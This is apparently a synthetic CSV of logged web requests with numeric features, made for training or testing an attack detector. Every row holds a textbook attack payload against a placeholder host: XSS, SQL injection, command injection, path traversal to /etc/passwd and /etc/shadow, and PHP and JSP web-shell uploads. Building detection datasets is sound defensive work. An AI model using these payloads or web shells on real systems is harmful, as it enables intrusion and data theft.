timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-02T20:16:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.02,7,1,33,0,500,464
2025-01-02T20:17:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.49,3,1,8,0,500,428
2025-01-02T20:18:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.22,0,1,2,0,302,1520
2025-01-02T20:19:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,6.35,1,1,3,0,403,300
2025-01-02T20:20:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.3,10,1,27,0,500,1085
2025-01-02T20:21:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.45,0,1,6,0,302,250
2025-01-02T20:22:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.7,7,1,19,0,403,290
2025-01-02T20:23:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.53,7,1,19,0,302,335
2025-01-02T20:24:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.47,10,1,27,0,302,540
2025-01-02T20:25:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.35,2,1,11,0,403,711
2025-01-02T20:26:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.05,3,1,8,0,200,1009
2025-01-02T20:27:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.76,7,1,33,0,302,1160
2025-01-02T20:28:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.68,3,1,8,0,500,1149
2025-01-02T20:29:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.16,7,1,25,0,403,1013
2025-01-02T20:30:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.73,6,1,21,0,403,1463
2025-01-02T20:31:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,3.68,7,1,25,0,302,1416
2025-01-02T20:32:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.69,7,1,11,0,500,456
2025-01-02T20:33:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.47,10,1,27,0,500,1563
2025-01-02T20:34:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.45,10,1,27,0,302,919
2025-01-02T20:35:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.59,13,1,22,0,500,663
2025-01-02T20:36:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.24,3,1,18,0,302,1359
2025-01-02T20:37:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.32,22,1,85,1,500,1315
2025-01-02T20:38:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.74,6,1,21,0,403,1182
2025-01-02T20:39:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.39,7,1,33,0,500,490
2025-01-02T20:40:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.27,0,1,2,0,302,1251
2025-01-02T20:41:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.8,7,1,33,0,200,1253
2025-01-02T20:42:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.25,7,1,25,0,500,260
2025-01-02T20:43:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.55,3,1,15,0,403,1384
2025-01-02T20:44:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.91,13,1,22,0,500,1451
2025-01-02T20:45:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.54,3,1,15,0,403,1440
2025-01-02T20:46:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.68,13,1,22,0,302,909
2025-01-02T20:47:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.55,3,1,15,0,302,566
2025-01-02T20:48:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.28,3,1,18,0,302,1106
2025-01-02T20:49:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.33,22,1,85,1,302,1073
2025-01-02T20:50:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.02,7,1,33,0,200,291
2025-01-02T20:51:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.71,1,1,3,0,200,737
2025-01-02T20:52:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.8,0,1,2,0,302,1595
2025-01-02T20:53:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.1,22,1,85,1,403,734
2025-01-02T20:54:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.7,0,1,2,0,500,1376
2025-01-02T20:55:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.4,3,1,18,0,200,1172
2025-01-02T20:56:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.33,6,1,21,0,302,1325
2025-01-02T20:57:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.3,6,1,21,0,500,650
2025-01-02T20:58:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.47,6,1,22,0,200,597
2025-01-02T20:59:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.22,19,1,55,1,200,993
2025-01-02T21:00:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.14,2,1,11,0,302,635
2025-01-02T21:01:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.81,7,1,11,0,302,1564
2025-01-02T21:02:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.13,7,1,11,0,200,911
2025-01-02T21:03:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.31,0,1,6,0,200,830
2025-01-02T21:04:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.54,2,1,11,0,302,421
2025-01-02T21:05:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.32,7,1,19,0,200,1479
2025-01-02T21:06:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.03,22,1,85,1,500,1509
2025-01-02T21:07:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.11,6,1,21,0,302,291
2025-01-02T21:08:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.82,22,1,85,1,200,885
2025-01-02T21:09:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.36,19,1,55,1,200,1505
2025-01-02T21:10:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.77,19,1,55,1,200,1389
2025-01-02T21:11:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.01,7,1,11,0,200,287
2025-01-02T21:12:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.33,3,1,8,0,500,416
2025-01-02T21:13:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.84,22,1,85,1,200,681
2025-01-02T21:14:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.64,6,1,21,0,200,1039
2025-01-02T21:15:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.05,10,1,27,0,403,487
2025-01-02T21:16:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.87,19,1,55,1,500,994
2025-01-02T21:17:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.63,7,1,33,0,302,757
2025-01-02T21:18:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,3.9,0,1,6,0,200,996
2025-01-02T21:19:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.35,22,1,85,1,500,877
2025-01-02T21:20:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.05,13,1,22,0,500,1119
2025-01-02T21:21:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.08,10,1,27,0,302,446
2025-01-02T21:22:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.7,0,1,6,0,403,1242
2025-01-02T21:23:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.01,6,1,22,0,500,848
2025-01-02T21:24:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.75,7,1,19,0,302,873
2025-01-02T21:25:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.29,22,1,85,1,403,936
2025-01-02T21:26:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.52,22,1,85,1,200,840
2025-01-02T21:27:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.78,7,1,11,0,403,394
2025-01-02T21:28:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,3.88,3,1,18,0,200,341
2025-01-02T21:29:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.34,0,1,2,0,302,404
2025-01-02T21:30:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.88,22,1,85,1,302,737
2025-01-02T21:31:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,6.36,7,1,19,0,403,209
2025-01-02T21:32:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.38,13,1,22,0,302,1494
2025-01-02T21:33:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.99,19,1,55,1,403,1546
2025-01-02T21:34:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.85,2,1,11,0,500,311
2025-01-02T21:35:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.21,3,1,8,0,403,750
2025-01-02T21:36:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.29,13,1,22,0,403,661
2025-01-02T21:37:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.29,7,1,11,0,403,447
2025-01-02T21:38:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.64,19,1,55,1,500,1498
2025-01-02T21:39:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.71,3,1,18,0,302,962
2025-01-02T21:40:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.27,19,1,55,1,200,570
2025-01-02T21:41:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.68,7,1,25,0,403,1294
2025-01-02T21:42:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.27,3,1,15,0,200,1434
2025-01-02T21:43:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.83,19,1,55,1,403,1493
2025-01-02T21:44:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,6.03,6,1,22,0,200,1537
2025-01-02T21:45:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.38,7,1,11,0,500,1086
2025-01-02T21:46:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.96,10,1,27,0,403,721
2025-01-02T21:47:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.97,22,1,85,1,302,1089
2025-01-02T21:48:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.4,22,1,85,1,500,1537
2025-01-02T21:49:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.16,13,1,22,0,500,1056
2025-01-02T21:50:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.21,7,1,19,0,500,424
2025-01-02T21:51:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.06,10,1,27,0,403,458
2025-01-02T21:52:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.04,8,1,28,0,403,234
2025-01-02T21:53:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.27,3,1,8,0,200,456
2025-01-02T21:54:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.67,2,1,11,0,403,611
2025-01-02T21:55:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.61,10,1,27,0,403,261
2025-01-02T21:56:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.47,22,1,85,1,302,1547
2025-01-02T21:57:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,3.99,3,1,18,0,500,1266
2025-01-02T21:58:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.0,0,1,2,0,500,1546
2025-01-02T21:59:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,6.32,7,1,19,0,302,1257
2025-01-02T22:00:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.9,7,1,33,0,200,1595
2025-01-02T22:01:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.99,19,1,55,1,302,1044
2025-01-02T22:02:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.72,22,1,85,1,302,439
2025-01-02T22:03:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.9,10,1,27,0,302,324
2025-01-02T22:04:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.84,22,1,85,1,403,744
2025-01-02T22:05:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.56,13,1,22,0,403,874
2025-01-02T22:06:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.22,6,1,21,0,500,1458
2025-01-02T22:07:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.02,19,1,55,1,200,1113
2025-01-02T22:08:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.5,3,1,8,0,302,943
2025-01-02T22:09:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.07,22,1,85,1,302,1073
2025-01-02T22:10:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.08,7,1,33,0,200,245
2025-01-02T22:11:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,6.03,6,1,21,0,302,1364
2025-01-02T22:12:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.85,2,1,11,0,200,1379
2025-01-02T22:13:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.24,3,1,18,0,403,1489
2025-01-02T22:14:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.53,3,1,8,0,200,1596
2025-01-02T22:15:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.79,6,1,22,0,200,292
2025-01-02T22:16:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.6,2,1,11,0,302,928
2025-01-02T22:17:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,3.52,7,1,25,0,302,713
2025-01-02T22:18:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.95,6,1,21,0,403,1502
2025-01-02T22:19:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.71,6,1,21,0,200,1147
2025-01-02T22:20:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.28,7,1,11,0,302,254
2025-01-02T22:21:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.97,2,1,11,0,403,479
2025-01-02T22:22:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.58,22,1,85,1,403,1491
2025-01-02T22:23:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.8,10,1,27,0,403,1455
2025-01-02T22:24:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.45,3,1,15,0,500,1258
2025-01-02T22:25:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.41,19,1,55,1,500,1363
2025-01-02T22:26:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.98,19,1,55,1,302,1162
2025-01-02T22:27:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.87,22,1,85,1,500,966
2025-01-02T22:28:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.87,3,1,8,0,500,930
2025-01-02T22:29:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.61,22,1,85,1,200,898
2025-01-02T22:30:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.98,6,1,22,0,500,1172
2025-01-02T22:31:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.23,0,1,6,0,200,804
2025-01-02T22:32:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.08,13,1,22,0,403,549
2025-01-02T22:33:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.14,2,1,11,0,302,915
2025-01-02T22:34:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,3.89,6,1,21,0,500,282
2025-01-02T22:35:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.31,3,1,15,0,500,931
2025-01-02T22:36:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.51,10,1,27,0,302,1125
2025-01-02T22:37:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.69,8,1,28,0,302,599
2025-01-02T22:38:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.43,7,1,25,0,200,326
2025-01-02T22:39:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.36,19,1,55,1,403,782
2025-01-02T22:40:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.81,19,1,55,1,500,1044
2025-01-02T22:41:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.88,7,1,11,0,500,1080
2025-01-02T22:42:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.3,22,1,85,1,200,1458
2025-01-02T22:43:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.49,13,1,22,0,500,335
2025-01-02T22:44:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.5,3,1,15,0,200,262
2025-01-02T22:45:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.97,6,1,21,0,403,319
2025-01-02T22:46:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,5.03,8,1,28,0,302,417
2025-01-02T22:47:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.6,6,1,21,0,403,599
2025-01-02T22:48:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,6.18,7,1,19,0,302,544
2025-01-02T22:49:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.11,3,1,15,0,200,961
2025-01-02T22:50:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.28,3,1,18,0,302,202
2025-01-02T22:51:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.77,0,1,6,0,302,1233
2025-01-02T22:52:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.48,3,1,15,0,403,1246
2025-01-02T22:53:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,6.22,6,1,22,0,403,1211
2025-01-02T22:54:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.46,10,1,27,0,500,1099
2025-01-02T22:55:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.88,19,1,55,1,302,376
2025-01-02T22:56:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.91,13,1,22,0,500,852
